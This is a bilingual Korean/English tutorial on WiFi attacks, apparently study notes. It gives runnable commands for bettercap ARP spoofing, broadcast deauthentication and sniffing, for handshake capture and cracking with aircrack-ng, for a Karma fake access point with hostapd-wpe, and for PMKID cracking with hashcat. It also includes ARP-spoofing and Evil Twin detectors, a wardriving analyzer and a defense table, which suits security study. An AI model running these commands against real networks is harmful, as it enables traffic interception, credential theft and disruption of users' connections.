> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 고급 WiFi 공격 기법

## 0. 초보자를 위한 개념 이해

### 고급 WiFi 공격이란?

고급 WiFi 공격은 단순한 패스워드 크래킹을 넘어, 네트워크에 연결된 후 트래픽을 감청하거나 클라이언트를 조작하는 기법입니다. ARP 스푸핑을 통한 MITM(중간자 공격)은 같은 네트워크의 모든 트래픽을 가로채고, Deauthentication 공격은 특정 클라이언트를 강제 연결 해제할 수 있습니다. Evil Twin(가짜 AP) 공격은 피해자를 악성 AP에 연결시켜 자격증명을 탈취합니다.

**왜 배우는가:**
```
고급 WiFi 공격 유형:

  ARP 스푸핑 + MITM
    같은 네트워크 → 게이트웨이 ARP 응답 위조
    → 피해자 트래픽을 공격자 통해 라우팅
    → HTTP 평문 데이터, 쿠키 탈취

  Deauthentication 공격
    WiFi 관리 프레임 미인증 (802.11 취약점)
    → 위조된 Deauth 패킷 전송
    → 클라이언트 강제 연결 해제

  Evil Twin (가짜 AP)
    동일 SSID의 강한 신호 AP 생성
    + Deauth로 정상 AP 연결 방해
    → 피해자 자동 연결 → MITM / 캡티브 포털
```

### 핵심 개념 정리

```
주요 도구 역할:

  bettercap    — ARP 스푸핑·DNS 스푸핑·MITM 자동화
                  모든 기능을 대화형 명령으로 실행
  mitmproxy    — HTTPS 트래픽 인터셉트 프록시
  hostapd      — 소프트웨어 AP 생성 (Evil Twin)
  dnsmasq      — DHCP/DNS 서버 (가짜 AP 필수)
  airgeddon    — WiFi 공격 올인원 메뉴 기반 프레임워크

ARP 스푸핑 원리:
  정상: 피해자 → (ARP) → 게이트웨이의 MAC 획득
  공격: 피해자 → (위조 ARP) → 공격자 MAC = 게이트웨이로 착각
  결과: 피해자 트래픽이 공격자를 경유
```

### 필요한 도구 및 환경
- **bettercap**: 네트워크 MITM 자동화 프레임워크
- **hostapd**: 소프트웨어 AP 구성 데몬
- **dnsmasq**: 경량 DHCP/DNS 서버
- **무선 랜카드 2개**: AP 모드 + 모니터 모드 동시 운용

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""ARP 스푸핑 탐지 — 로컬 네트워크의 ARP 테이블 이상 감지."""

import subprocess
import re
from dataclasses import dataclass
from collections import defaultdict


@dataclass
class ArpEntry:
    ip: str
    mac: str
    interface: str


def get_arp_table() -> list[ArpEntry]:
    """현재 시스템의 ARP 테이블을 조회합니다."""
    result = subprocess.run(["arp", "-n"], capture_output=True, text=True)
    entries: list[ArpEntry] = []
    for line in result.stdout.splitlines()[1:]:  # 헤더 스킵
        parts = line.split()
        if len(parts) >= 3 and ":" in parts[2]:
            entries.append(ArpEntry(
                ip=parts[0],
                mac=parts[2].lower(),
                interface=parts[-1] if len(parts) > 4 else "unknown",
            ))
    return entries


def detect_arp_spoofing(entries: list[ArpEntry]) -> list[str]:
    """하나의 MAC이 여러 IP를 갖거나, 동일 IP에 여러 MAC이 있으면 경고."""
    warnings: list[str] = []
    ip_to_macs: dict[str, set[str]] = defaultdict(set)
    mac_to_ips: dict[str, set[str]] = defaultdict(set)

    for e in entries:
        ip_to_macs[e.ip].add(e.mac)
        mac_to_ips[e.mac].add(e.ip)

    for ip, macs in ip_to_macs.items():
        if len(macs) > 1:
            warnings.append(f"[경고] IP {ip}에 여러 MAC: {macs} → ARP 스푸핑 의심!")

    for mac, ips in mac_to_ips.items():
        if len(ips) > 3:  # 임계값: 3개 이상 IP
            warnings.append(f"[경고] MAC {mac}이 {len(ips)}개 IP 응답 → MITM 의심!")

    return warnings


if __name__ == "__main__":
    arp_table = get_arp_table()
    print(f"ARP 테이블 항목: {len(arp_table)}개")
    warnings = detect_arp_spoofing(arp_table)
    if warnings:
        for w in warnings:
            print(w)
    else:
        print("ARP 스푸핑 의심 패턴 없음")
```

---

## 1. Bettercap - MITM 자동화

```bash
# Bettercap 설치
apt install bettercap

# 기본 실행 (인터페이스 지정)
bettercap -iface wlan0

# 대화형 모드 명령어
net.probe on          # 호스트 탐지
net.show              # 발견된 호스트 목록
arp.spoof on          # ARP 스푸핑 시작
net.sniff on          # 패킷 스니핑

# WiFi 모드
wifi.recon on         # WiFi 정찰 시작
wifi.show             # AP 목록
wifi.deauth FF:FF:FF:FF:FF:FF  # 전체 디어인증 공격
```

```
# Bettercap 자동화 캡릿 (mitm.cap)
net.probe on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
set net.sniff.output /tmp/capture.pcap
net.sniff on
```

```bash
# 캡릿 실행
bettercap -iface wlan0 -caplet mitm.cap
```

---

## 2. Airgeddon - 올인원 WiFi 공격 프레임워크

```bash
# Airgeddon 설치
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
bash airgeddon.sh

# 메뉴 구조
# 1. 인터페이스 선택
# 2. 모니터 모드 전환
# 3. 핸드셰이크 캡처
# 4. Evil Twin AP 생성
# 5. WPS 공격
# 6. PMKID 공격
```

### 핸드셰이크 캡처

```bash
# 1. 모니터 모드 활성화
airmon-ng start wlan0
# → wlan0mon 생성

# 2. AP 스캔
airodump-ng wlan0mon

# 3. 특정 AP 대상 캡처
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. 디어인증 공격으로 핸드셰이크 강제 발생
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. 캡처된 핸드셰이크 크랙
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

---

## 3. Karma 공격 - 가짜 AP 자동 응답

```bash
# hostapd-wpe 설치 (WPA Enterprise 공격)
apt install hostapd-wpe

# karma 공격용 설정 파일 생성
cat > /tmp/karma.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
# Karma 모드 (모든 프로브 요청 응답)
karma=1
EOF

# 실행
hostapd-wpe /tmp/karma.conf
```

```python
#!/usr/bin/env python3
"""Scapy 기반 Evil Twin 탐지기."""

from scapy.all import sniff, Dot11, Dot11Beacon, Dot11ProbeResp
from dataclasses import dataclass, field
from collections import defaultdict


@dataclass
class EvilTwinDetector:
    known_aps: dict[str, set[str]] = field(default_factory=lambda: defaultdict(set))
    alerts: list[str] = field(default_factory=list)

    def analyze_beacon(self, pkt) -> None:
        if not pkt.haslayer(Dot11Beacon):
            return

        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Beacon].info.decode(errors="ignore")

        if ssid in self.known_aps:
            if bssid not in self.known_aps[ssid]:
                alert = f"[!] Evil Twin 탐지! SSID={ssid}, 신규 BSSID={bssid}"
                self.alerts.append(alert)
                print(alert)
        else:
            self.known_aps[ssid].add(bssid)

    def start(self, iface: str = "wlan0mon") -> None:
        print(f"[*] Evil Twin 탐지 시작 ({iface})")
        sniff(iface=iface, prn=self.analyze_beacon, store=False)


if __name__ == "__main__":
    detector = EvilTwinDetector()
    detector.start()
```

---

## 4. PMKID 공격 (핸드셰이크 없이 크랙)

```bash
# hcxdumptool 설치
apt install hcxdumptool hcxtools

# PMKID 캡처 (연결 없이 AP에서 직접 획득)
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# pcapng를 hashcat 형식으로 변환
hcxpcapngtool -o hash.22000 capture.pcapng

# hashcat으로 크랙
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt

# GPU 가속 크랙
hashcat -m 22000 hash.22000 rockyou.txt --force -d 1
```

---

## 5. Wardriving 분석 도구

```python
#!/usr/bin/env python3
"""Wardriving 데이터 분석 및 히트맵 생성."""

import argparse
import csv
import math
from dataclasses import dataclass
from pathlib import Path


@dataclass
class AccessPoint:
    ssid: str
    bssid: str
    lat: float
    lon: float
    signal: int
    encryption: str
    channel: int


def parse_wigle_csv(filepath: Path) -> list[AccessPoint]:
    """WiGLE CSV 형식 파싱."""
    aps = []
    with open(filepath, newline="", encoding="utf-8", errors="ignore") as f:
        # WiGLE CSV 헤더 스킵
        for line in f:
            if line.startswith("MAC,SSID"):
                break
        reader = csv.DictReader(f)
        for row in reader:
            try:
                aps.append(AccessPoint(
                    ssid=row.get("SSID", ""),
                    bssid=row.get("MAC", ""),
                    lat=float(row.get("CurrentLatitude", 0)),
                    lon=float(row.get("CurrentLongitude", 0)),
                    signal=int(row.get("RSSI", -100)),
                    encryption=row.get("AuthMode", ""),
                    channel=int(row.get("Channel", 0)),
                ))
            except (ValueError, KeyError):
                continue
    return aps


def analyze_security(aps: list[AccessPoint]) -> dict:
    """보안 통계 분석."""
    total = len(aps)
    if not total:
        return {}

    open_count = sum(1 for ap in aps if "OPN" in ap.encryption.upper() or not ap.encryption)
    wep_count  = sum(1 for ap in aps if "WEP" in ap.encryption.upper())
    wpa_count  = sum(1 for ap in aps if "WPA" in ap.encryption.upper() and "WPA2" not in ap.encryption.upper())
    wpa2_count = sum(1 for ap in aps if "WPA2" in ap.encryption.upper())
    wpa3_count = sum(1 for ap in aps if "WPA3" in ap.encryption.upper())

    return {
        "total": total,
        "open":  open_count,
        "wep":   wep_count,
        "wpa":   wpa_count,
        "wpa2":  wpa2_count,
        "wpa3":  wpa3_count,
        "open_pct":  round(open_count / total * 100, 1),
        "insecure_pct": round((open_count + wep_count) / total * 100, 1),
    }


def generate_heatmap_html(aps: list[AccessPoint], output: Path) -> None:
    """Leaflet.js 기반 히트맵 HTML 생성."""
    points = [
        f"[{ap.lat}, {ap.lon}, {max(0, ap.signal + 100)}]"
        for ap in aps if ap.lat and ap.lon
    ]

    center_lat = sum(ap.lat for ap in aps if ap.lat) / max(len(aps), 1)
    center_lon = sum(ap.lon for ap in aps if ap.lon) / max(len(aps), 1)

    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>WiFi Heatmap</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.heat/dist/leaflet-heat.js"></script>
    <style>body,#map{{margin:0;height:100vh}}</style>
</head>
<body>
<div id="map"></div>
<script>
    var map = L.map('map').setView([{center_lat:.6f}, {center_lon:.6f}], 14);
    L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png').addTo(map);
    var points = [{", ".join(points[:2000])}];
    L.heatLayer(points, {{radius:15, blur:10, maxZoom:17}}).addTo(map);
</script>
</body></html>"""

    output.write_text(html, encoding="utf-8")
    print(f"[+] 히트맵 저장: {output}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Wardriving 데이터 분석")
    parser.add_argument("csv_file", type=Path, help="WiGLE CSV 파일")
    parser.add_argument("--heatmap", type=Path, help="히트맵 HTML 출력 경로")
    args = parser.parse_args()

    aps = parse_wigle_csv(args.csv_file)
    print(f"[+] {len(aps)}개 AP 로드")

    stats = analyze_security(aps)
    print(f"\n=== 보안 통계 ===")
    print(f"  전체: {stats['total']}")
    print(f"  개방형(오픈): {stats['open']} ({stats['open_pct']}%)")
    print(f"  WEP: {stats['wep']}")
    print(f"  WPA: {stats['wpa']}")
    print(f"  WPA2: {stats['wpa2']}")
    print(f"  WPA3: {stats['wpa3']}")
    print(f"  취약 합계: {stats['insecure_pct']}%")

    if args.heatmap:
        generate_heatmap_html(aps, args.heatmap)


if __name__ == "__main__":
    main()
```

---

## 6. WiFi 방어 전략

| 위협 | 대책 |
|------|------|
| Evil Twin / Karma | 802.1X EAP 인증, 인증서 검증 |
| 디어인증 공격 | 802.11w (PMF, Protected Management Frames) |
| PMKID 크랙 | 강력한 랜덤 패스프레이즈 (20자+) |
| 핸드셰이크 캡처 | WPA3-SAE (Dragonfly) 전환 |
| Rogue AP | WIDS/WIPS (Wireless IDS/IPS) |
| MITM | HTTPS Everywhere, VPN 사용 |

---

<a name="english"></a>

# Advanced WiFi Attack Techniques

## 1. Bettercap - MITM Automation

```bash
# Install Bettercap
apt install bettercap

# Basic execution (specify interface)
bettercap -iface wlan0

# Interactive mode commands
net.probe on          # Discover hosts
net.show              # Show discovered host list
arp.spoof on          # Start ARP spoofing
net.sniff on          # Packet sniffing

# WiFi mode
wifi.recon on         # Start WiFi reconnaissance
wifi.show             # Show AP list
wifi.deauth FF:FF:FF:FF:FF:FF  # Full deauthentication attack
```

```
# Bettercap automation caplet (mitm.cap)
net.probe on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
set net.sniff.output /tmp/capture.pcap
net.sniff on
```

```bash
# Run caplet
bettercap -iface wlan0 -caplet mitm.cap
```

---

## 2. Airgeddon - All-in-One WiFi Attack Framework

```bash
# Install Airgeddon
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
bash airgeddon.sh

# Menu structure
# 1. Select interface
# 2. Enable monitor mode
# 3. Capture handshake
# 4. Create Evil Twin AP
# 5. WPS attack
# 6. PMKID attack
```

### Handshake Capture

```bash
# 1. Enable monitor mode
airmon-ng start wlan0
# → Creates wlan0mon

# 2. Scan for APs
airodump-ng wlan0mon

# 3. Capture targeting specific AP
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Force handshake with deauthentication attack
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

---

## 3. Karma Attack - Fake AP Auto-Response

```bash
# Install hostapd-wpe (WPA Enterprise attacks)
apt install hostapd-wpe

# Create karma attack config file
cat > /tmp/karma.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
# Karma mode (respond to all probe requests)
karma=1
EOF

# Run
hostapd-wpe /tmp/karma.conf
```

```python
#!/usr/bin/env python3
"""Scapy-based Evil Twin detector."""

from scapy.all import sniff, Dot11, Dot11Beacon, Dot11ProbeResp
from dataclasses import dataclass, field
from collections import defaultdict


@dataclass
class EvilTwinDetector:
    known_aps: dict[str, set[str]] = field(default_factory=lambda: defaultdict(set))
    alerts: list[str] = field(default_factory=list)

    def analyze_beacon(self, pkt) -> None:
        if not pkt.haslayer(Dot11Beacon):
            return

        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Beacon].info.decode(errors="ignore")

        if ssid in self.known_aps:
            if bssid not in self.known_aps[ssid]:
                alert = f"[!] Evil Twin detected! SSID={ssid}, new BSSID={bssid}"
                self.alerts.append(alert)
                print(alert)
        else:
            self.known_aps[ssid].add(bssid)

    def start(self, iface: str = "wlan0mon") -> None:
        print(f"[*] Starting Evil Twin detection ({iface})")
        sniff(iface=iface, prn=self.analyze_beacon, store=False)


if __name__ == "__main__":
    detector = EvilTwinDetector()
    detector.start()
```

---

## 4. PMKID Attack (Crack Without Handshake)

```bash
# Install hcxdumptool
apt install hcxdumptool hcxtools

# Capture PMKID (obtained directly from AP without connecting)
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert pcapng to hashcat format
hcxpcapngtool -o hash.22000 capture.pcapng

# Crack with hashcat
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt

# GPU-accelerated cracking
hashcat -m 22000 hash.22000 rockyou.txt --force -d 1
```

---

## 5. Wardriving Analysis Tool

```python
#!/usr/bin/env python3
"""Wardriving data analysis and heatmap generation."""

import argparse
import csv
import math
from dataclasses import dataclass
from pathlib import Path


@dataclass
class AccessPoint:
    ssid: str
    bssid: str
    lat: float
    lon: float
    signal: int
    encryption: str
    channel: int


def parse_wigle_csv(filepath: Path) -> list[AccessPoint]:
    """Parse WiGLE CSV format."""
    aps = []
    with open(filepath, newline="", encoding="utf-8", errors="ignore") as f:
        # Skip WiGLE CSV header
        for line in f:
            if line.startswith("MAC,SSID"):
                break
        reader = csv.DictReader(f)
        for row in reader:
            try:
                aps.append(AccessPoint(
                    ssid=row.get("SSID", ""),
                    bssid=row.get("MAC", ""),
                    lat=float(row.get("CurrentLatitude", 0)),
                    lon=float(row.get("CurrentLongitude", 0)),
                    signal=int(row.get("RSSI", -100)),
                    encryption=row.get("AuthMode", ""),
                    channel=int(row.get("Channel", 0)),
                ))
            except (ValueError, KeyError):
                continue
    return aps


def analyze_security(aps: list[AccessPoint]) -> dict:
    """Analyze security statistics."""
    total = len(aps)
    if not total:
        return {}

    open_count = sum(1 for ap in aps if "OPN" in ap.encryption.upper() or not ap.encryption)
    wep_count  = sum(1 for ap in aps if "WEP" in ap.encryption.upper())
    wpa_count  = sum(1 for ap in aps if "WPA" in ap.encryption.upper() and "WPA2" not in ap.encryption.upper())
    wpa2_count = sum(1 for ap in aps if "WPA2" in ap.encryption.upper())
    wpa3_count = sum(1 for ap in aps if "WPA3" in ap.encryption.upper())

    return {
        "total": total,
        "open":  open_count,
        "wep":   wep_count,
        "wpa":   wpa_count,
        "wpa2":  wpa2_count,
        "wpa3":  wpa3_count,
        "open_pct":  round(open_count / total * 100, 1),
        "insecure_pct": round((open_count + wep_count) / total * 100, 1),
    }


def generate_heatmap_html(aps: list[AccessPoint], output: Path) -> None:
    """Generate Leaflet.js-based heatmap HTML."""
    points = [
        f"[{ap.lat}, {ap.lon}, {max(0, ap.signal + 100)}]"
        for ap in aps if ap.lat and ap.lon
    ]

    center_lat = sum(ap.lat for ap in aps if ap.lat) / max(len(aps), 1)
    center_lon = sum(ap.lon for ap in aps if ap.lon) / max(len(aps), 1)

    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>WiFi Heatmap</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.heat/dist/leaflet-heat.js"></script>
    <style>body,#map{{margin:0;height:100vh}}</style>
</head>
<body>
<div id="map"></div>
<script>
    var map = L.map('map').setView([{center_lat:.6f}, {center_lon:.6f}], 14);
    L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png').addTo(map);
    var points = [{", ".join(points[:2000])}];
    L.heatLayer(points, {{radius:15, blur:10, maxZoom:17}}).addTo(map);
</script>
</body></html>"""

    output.write_text(html, encoding="utf-8")
    print(f"[+] Heatmap saved: {output}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Wardriving data analysis")
    parser.add_argument("csv_file", type=Path, help="WiGLE CSV file")
    parser.add_argument("--heatmap", type=Path, help="Heatmap HTML output path")
    args = parser.parse_args()

    aps = parse_wigle_csv(args.csv_file)
    print(f"[+] Loaded {len(aps)} APs")

    stats = analyze_security(aps)
    print(f"\n=== Security Statistics ===")
    print(f"  Total: {stats['total']}")
    print(f"  Open: {stats['open']} ({stats['open_pct']}%)")
    print(f"  WEP: {stats['wep']}")
    print(f"  WPA: {stats['wpa']}")
    print(f"  WPA2: {stats['wpa2']}")
    print(f"  WPA3: {stats['wpa3']}")
    print(f"  Insecure total: {stats['insecure_pct']}%")

    if args.heatmap:
        generate_heatmap_html(aps, args.heatmap)


if __name__ == "__main__":
    main()
```

---

## 6. WiFi Defense Strategies

| Threat | Countermeasure |
|--------|----------------|
| Evil Twin / Karma | 802.1X EAP authentication, certificate validation |
| Deauthentication attack | 802.11w (PMF, Protected Management Frames) |
| PMKID cracking | Strong random passphrase (20+ characters) |
| Handshake capture | Migrate to WPA3-SAE (Dragonfly) |
| Rogue AP | WIDS/WIPS (Wireless IDS/IPS) |
| MITM | HTTPS Everywhere, use VPN |
